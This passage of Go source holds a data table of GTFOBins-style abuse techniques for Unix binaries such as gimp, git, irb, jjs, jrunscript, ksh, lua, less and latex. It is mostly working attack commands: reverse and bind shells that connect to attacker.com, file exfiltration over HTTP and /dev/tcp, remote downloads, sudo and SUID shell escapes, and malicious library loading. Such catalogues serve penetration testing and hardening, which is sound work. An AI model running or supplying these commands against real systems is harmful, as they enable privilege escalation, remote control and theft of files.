System.Process.callCommand "/bin/sh"
`, "code"},
		},
	},
	"gimp": map[string][]Functions{
		"shell": []Functions{
			Functions{`gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'`, "code"},
		},
		"file-write": []Functions{
			Functions{`gimp -idf --batch-interpreter=python-fu-eval -b 'open("file_to_write", "wb").write("DATA")'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`gimp -idf --batch-interpreter=python-fu-eval -b 'print(open("file_to_read").read())'`, "code"},
		},
		"suid": []Functions{
			Functions{`./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
`, "code"},
			Functions{`Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])'
`, "code"},
		},
		"library-load": []Functions{
			Functions{`gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'`, "code"},
		},
	},
	"git": map[string][]Functions{
		"shell": []Functions{
			Functions{`PAGER='sh -c "exec sh 0<&1"' git -p help`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`git help config
!/bin/sh
`, "code"},
			Functions{`The help system can also be reached from any 'git' command, e.g., 'git branch'. This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`git branch --help config
!/bin/sh
`, "code"},
			Functions{`Git hooks are merely shell scripts and in the following example the hook associated to the 'pre-commit' action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the '-C' option.`, "description"},
			Functions{`TF=$(mktemp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
git -C "$TF" commit --allow-empty -m x
`, "code"},
			Functions{`TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
git "--exec-path=$TF" x
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is displayed in 'diff' style output format.`, "description"},
			Functions{`LFILE=file_to_read
git diff /dev/null $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo PAGER='sh -c "exec sh 0<&1"' git -p help`, "code"},
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo git -p help config
!/bin/sh
`, "code"},
			Functions{`The help system can also be reached from any 'git' command, e.g., 'git branch'. This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo git branch --help config
!/bin/sh
`, "code"},
			Functions{`Git hooks are merely shell scripts and in the following example the hook associated to the 'pre-commit' action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the '-C' option.`, "description"},
			Functions{`TF=$(mktemp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
sudo git -C "$TF" commit --allow-empty -m x
`, "code"},
			Functions{`TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`PAGER='sh -c "exec sh 0<&1"' ./git -p help`, "code"},
		},
	},
	"grep": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
grep '' $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./grep '' $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo grep '' $LFILE
`, "code"},
		},
	},
	"gtester": map[string][]Functions{
		"file-write": []Functions{
			Functions{`Data to be written appears in an XML attribute in the output file ('<testbinary path="DATA">').`, "description"},
			Functions{`LFILE=file_to_write
gtester "DATA" -o $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
`, "code"},
		},
		"suid": []Functions{
			Functions{`TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
`, "code"},
		},
	},
	"gzip": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
gzip -f $LFILE -t
`, "code"},
			Functions{`LFILE=file_to_read
gzip -c $LFILE | gzip -d
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./gzip -f $LFILE -t
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo gzip -f $LFILE -t
`, "code"},
		},
	},
	"hd": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
hd "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./hd "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo hd "$LFILE"
`, "code"},
		},
	},
	"head": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
head -c1G "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./head -c1G "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo head -c1G "$LFILE"
`, "code"},
		},
	},
	"hexdump": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
hexdump -C "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./hexdump -C "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo hexdump -C "$LFILE"
`, "code"},
		},
	},
	"highlight": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
highlight --no-doc --failsafe "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./highlight --no-doc --failsafe "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo highlight --no-doc --failsafe "$LFILE"
`, "code"},
		},
	},
	"hping3": map[string][]Functions{
		"suid": []Functions{
			Functions{`./hping3
/bin/sh -p
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo hping3
/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`hping3
/bin/sh
`, "code"},
		},
	},
	"iconv": map[string][]Functions{
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
`, "code"},
		},
	},
	"iftop": map[string][]Functions{
		"shell": []Functions{
			Functions{`iftop
!/bin/sh
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./iftop
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo iftop
!/bin/sh
`, "code"},
		},
	},
	"install": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_change
TF=$(mktemp)
./install -m 6777 $LFILE $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_change
TF=$(mktemp)
sudo install -m 6777 $LFILE $TF
`, "code"},
		},
	},
	"ionice": map[string][]Functions{
		"suid": []Functions{
			Functions{`./ionice /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ionice /bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`ionice /bin/sh`, "code"},
		},
	},
	"ip": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
ip -force -batch "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./ip -force -batch "$LFILE"
`, "code"},
			Functions{`This only works for Linux with CONFIG_NET_NS=y.`, "description"},
			Functions{`./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo ip -force -batch "$LFILE"
`, "code"},
			Functions{`This only works for Linux with CONFIG_NET_NS=y.`, "description"},
			Functions{`sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo
`, "code"},
		},
	},
	"irb": map[string][]Functions{
		"library-load": []Functions{
			Functions{`irb
require "fiddle"; Fiddle.dlopen("lib.so")
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo irb
exec '/bin/bash'
`, "code"},
		},
		"shell": []Functions{
			Functions{`irb
exec '/bin/bash'
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Serve files in the local folder running an HTTP server on port 8888.`, "description"},
			Functions{`irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
`, "code"},
		},
		"file-write": []Functions{
			Functions{`irb
File.open("file_to_write", "w+") { |f| f.write("DATA") }
`, "code"},
		},
		"file-read": []Functions{
			Functions{`irb
puts File.read("file_to_read")
`, "code"},
		},
	},
	"jjs": map[string][]Functions{
		"shell": []Functions{
			Functions{`echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type("java.lang.System").getenv("RHOST");
var port=Java.type("java.lang.System").getenv("RPORT");
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var Socket = Java.type("java.net.Socket");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo "var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();" | jjs
`, "code"},
		},
		"file-write": []Functions{
			Functions{`echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("./file_to_write");
fw.write("DATA");
fw.close();' | jjs
`, "code"},
		},
		"file-read": []Functions{
			Functions{`echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("file_to_read"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
`, "code"},
		},
		"suid": []Functions{
			Functions{`This has been found working in macOS but failing on Linux systems.`, "description"},
			Functions{`echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs`, "code"},
		},
		"sudo": []Functions{
			Functions{`echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs`, "code"},
		},
	},
	"join": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
join -a 2 /dev/null $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
join -a 2 /dev/null $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo join -a 2 /dev/null $LFILE
`, "code"},
		},
	},
	"journalctl": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo journalctl
!/bin/sh
`, "code"},
		},
		"shell": []Functions{
			Functions{`journalctl
!/bin/sh
`, "code"},
		},
	},
	"jq": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
jq -Rr . "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./jq -Rr . "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo jq -Rr . "$LFILE"
`, "code"},
		},
	},
	"jrunscript": map[string][]Functions{
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
jrunscript -e "cp('$URL','$LFILE')"
`, "code"},
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
		},
		"file-write": []Functions{
			Functions{`jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'`, "code"},
		},
		"file-read": []Functions{
			Functions{`jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read")); while ((line = br.readLine()) != null) { print(line); }'`, "code"},
		},
		"suid": []Functions{
			Functions{`This has been found working in macOS but failing on Linux systems.`, "description"},
			Functions{`./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"`, "code"},
		},
		"shell": []Functions{
			Functions{`jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"`, "code"},
		},
	},
	"knife": map[string][]Functions{
		"shell": []Functions{
			Functions{`knife exec -E 'exec "/bin/sh"'
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo knife exec -E 'exec "/bin/sh"'
`, "code"},
		},
	},
	"ksh": map[string][]Functions{
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
`, "code"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
`, "code"},
			Functions{`Fetch remote file using a TCP connection. Run 'nc -l -p 12345 < "file_to_send"' on the attacker box to send the file.`, "description"},
		},
		"file-write": []Functions{
			Functions{`export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`It trims trailing newlines.`, "description"},
			Functions{`export LFILE=file_to_read
ksh -c 'echo "$(<$LFILE)"'
`, "code"},
			Functions{`It trims trailing newlines.`, "description"},
			Functions{`export LFILE=file_to_read
ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
`, "code"},
		},
		"suid": []Functions{
			Functions{`./ksh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ksh`, "code"},
		},
		"shell": []Functions{
			Functions{`ksh`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
`, "code"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
`, "code"},
			Functions{`Send local file using a TCP connection. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file.`, "description"},
		},
	},
	"ksshell": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
ksshell -i $LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./ksshell -i $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo ksshell -i $LFILE
`, "code"},
		},
	},
	"latex": map[string][]Functions{
		"shell": []Functions{
			Functions{`latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
`, "code"},
			Functions{`The read file will be part of the output.`, "description"},
		},
		"sudo": []Functions{
			Functions{`The read file will be part of the output.`, "description"},
			Functions{`sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
`, "code"},
			Functions{`sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
`, "code"},
		},
	},
	"ld": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo /lib/ld.so /bin/sh`, "code"},
		},
		"shell": []Functions{
			Functions{`/lib/ld.so /bin/sh`, "code"},
		},
		"suid": []Functions{
			Functions{`./ld.so /bin/sh -p`, "code"},
		},
	},
	"ldconfig": map[string][]Functions{
		"sudo": []Functions{
			Functions{`This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.`, "description"},
			Functions{`TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
sudo ldconfig -f "$TF/conf"
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.`, "description"},
			Functions{`TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"
`, "code"},
		},
	},
	"less": map[string][]Functions{
		"shell": []Functions{
			Functions{`less /etc/profile
!/bin/sh
`, "code"},
			Functions{`VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
`, "code"},
		},
		"file-read": []Functions{
			Functions{`less file_to_read`, "code"},
			Functions{`This is useful when 'less' is used as a pager by another binary to read a different file.`, "description"},
			Functions{`less /etc/profile
:e file_to_read
`, "code"},
		},
		"file-write": []Functions{
			Functions{`echo DATA | less
sfile_to_write
q
`, "code"},
			Functions{`less file_to_write
v
`, "code"},
			Functions{`This invokes the default editor to edit the file. The file must exist.`, "description"},
		},
		"sudo": []Functions{
			Functions{`sudo less /etc/profile
!/bin/sh
`, "code"},
		},
		"suid": []Functions{
			Functions{`./less file_to_read`, "code"},
		},
	},
	"ln": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo ln -fs /bin/sh /bin/ln
sudo ln
`, "code"},
		},
	},
	"loginctl": map[string][]Functions{
		"shell": []Functions{
			Functions{`loginctl user-status
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo loginctl user-status
!/bin/sh
`, "code"},
		},
	},
	"logsave": map[string][]Functions{
		"shell": []Functions{
			Functions{`logsave /dev/null /bin/sh -i`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo logsave /dev/null /bin/sh -i`, "code"},
		},
		"suid": []Functions{
			Functions{`./logsave /dev/null /bin/sh -i -p`, "code"},
		},
	},
	"look": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
look '' "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./look '' "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo look '' "$LFILE"
`, "code"},
		},
	},
	"ltrace": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo ltrace -b -L /bin/sh`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.`, "description"},
			Functions{`LFILE=file_to_read
ltrace -F $LFILE /dev/null
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of 'ltrace -F DATA'.`, "description"},
			Functions{`LFILE=file_to_write
ltrace -s 999 -o $LFILE ltrace -F DATA
`, "code"},
		},
		"shell": []Functions{
			Functions{`ltrace -b -L /bin/sh`, "code"},
		},
	},
	"lua": map[string][]Functions{
		"shell": []Functions{
			Functions{`lua -e 'os.execute("/bin/sh")'`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires 'lua-socket' installed.`, "description"},
			Functions{`export LPORT=12345
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires 'lua-socket' installed.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
		},
		"file-read": []Functions{
			Functions{`lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo lua -e 'os.execute("/bin/sh")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./lua -e 'os.execute("/bin/sh")'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires 'lua-socket' installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires 'lua-socket' installed.`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
  local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'`, "code"},
		},
		"suid": []Functions{
			Functions{`lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'`, "code"},
		},
	},
	"lualatex": map[string][]Functions{
		"shell": []Functions{
			Functions{`lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'`, "code"},
		},
	},
	"luatex": map[string][]Functions{
		"shell": []Functions{
			Functions{`luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./luatex -shell-escape '\directlua{os.execute("/bin/sh")}\end'`, "code"},
		},
	},
	"lwp-download": map[string][]Functions{
		"file-download": []Functions{
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
lwp-download $URL $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo lwp-download $URL $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file path must be absolute.`, "description"},
			Functions{`LFILE=file_to_read
TF=$(mktemp)
lwp-download "file://$LFILE" $TF
cat $TF
`, "code"},
		},
		"file-write": []Functions{
			Functions{`LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
lwp-download file://$TF $LFILE
`, "code"},
		},
	},
	"lwp-request": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
lwp-request "file://$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo lwp-request "file://$LFILE"
`, "code"},
		},
	},
	"mail": map[string][]Functions{
		"shell": []Functions{
			Functions{`GNU version only.`, "description"},
			Functions{`mail --exec='!/bin/sh'`, "code"},
			Functions{`This creates a valid Mbox file which may be required by the binary.`, "description"},
			Functions{`TF=$(mktemp)
echo "From nobody@localhost $(date)" > $TF
mail -f $TF
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`GNU version only.`, "description"},
			Functions{`sudo mail --exec='!/bin/sh'`, "code"},
		},
	},
	"make": map[string][]Functions{
		"file-write": []Functions{
			Functions{`Requires a newer GNU 'make' version.`, "description"},
			Functions{`LFILE=file_to_write
